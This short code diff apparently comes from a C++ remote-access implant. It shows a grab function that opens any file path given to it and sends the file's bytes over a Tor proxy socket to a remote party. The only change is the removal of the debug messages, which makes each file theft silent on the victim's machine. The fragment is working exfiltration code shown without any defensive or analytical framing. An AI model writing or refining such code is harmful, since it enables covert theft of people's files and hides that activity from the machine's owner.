@@ -155,10 +155,8 @@ public:
     }
 
     void grab(std::string path) {
-        printf("Attempting to open %s\n", path.c_str());
         std::ifstream f(path.c_str(), std::ios::binary);
         if (f.is_open() != true) {
-            printf("Failed to open!\n");
             this->torSock.proxySendStr("grab;" + path + ";0;ERR");
         }
         else {
@@ -172,7 +170,6 @@ public:
                 responseBytes.push_back(c);
             }
             this->torSock.proxySend(responseBytes.data(), responseBytes.size());
-            printf("Grab done\n");
         }
     }
     
